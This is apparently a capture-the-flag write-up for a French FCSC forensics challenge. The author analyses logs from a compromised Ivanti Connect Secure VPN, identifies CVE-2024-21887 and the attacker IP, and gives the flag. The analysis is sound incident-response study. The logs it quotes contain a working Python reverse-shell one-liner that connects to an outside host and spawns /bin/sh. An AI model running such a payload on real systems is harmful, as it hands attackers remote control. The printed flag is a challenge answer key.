# Horreur, malheur 2/5 - Accès initial

## Challenge
Introduction commune à la série Horreur, malheur

Vous venez d'être embauché en tant que Responsable de la Sécurité des Systèmes d'Information (RSSI) d'une entreprise stratégique.

En arrivant à votre bureau le premier jour, vous vous rendez compte que votre prédécesseur vous a laissé une clé USB avec une note dessus : VPN compromis (intégrité). Version 22.3R1 b1647.

Note : La première partie (Archive chiffrée) débloque les autres parties, à l'exception de la seconde partie (Accès initial) qui peut être traitée indépendamment. Nous vous recommandons de traiter les parties dans l'ordre.

Sur la clé USB, vous trouvez deux fichiers : une archive chiffrée et les journaux de l'équipement. Vous focalisez maintenant votre attention sur les journaux. L'équipement étant compromis, vous devez retrouver la vulnérabilité utilisée par l'attaquant ainsi que l'adresse IP de ce dernier.

> Le flag est au format : FCSC{CVE-XXXX-XXXXX:<adresse_IP>}.

## Inputs
- Logs in a tar archive

## Logs analysis
I noticed this weid call in the `nodemonlog.old` log:
```
data/var/dlogs/nodemonlog.old:301:21969     1  0.0  0.0 S   452   4852  3808 /bin/sh -c /home/perl5/bin/perl /home/perl/AwsAzureTestConnection.pl ;python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("20.13.3.0",4444));subprocess.call(["/bin/sh","-i
data/var/dlogs/nodemonlog.old:302:21971 21969  0.0  0.0 S  2296   9532  7972 python -c import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("20.13.3.0",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
data/var/dlogs/nodemonlog.old:318:22155 22147  0.0  0.0 S   452   4852  3616 /bin/sh -c /home/perl5/bin/perl /home/perl/AwsAzureTestConnection.pl ;python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("20.13.3.0",4444));subprocess.call(["/bin/sh","-i
data/var/dlogs/nodemonlog.old:319:22157 22155  0.0  0.0 S  2296   9532  8004 python -c import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("20.13.3.0",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
```

After Googling around, this is a signature for `CVE-2024-21887`, an issue in `Ivanti Connect Secure` VPN solution.

See for instance https://www.iblue.team/incident-response-1/ivanti-connect-secure-auth-bypass-and-remote-code-authentication-cve-2024-21887, where this is noted to be a relevant string:
```console
python -c import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
/home/perl5/bin/perl /home/perl/AwsAzureTestConnection.pl ;python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",4444));subprocess.call(["/bin/sh",
/bin/sh
```

Also, we see that it wants to reach back to `20.13.3.0:4444`, where the attacker listens to.

## Flag
> FCSC{CVE-2024-21887:20.13.3.0}
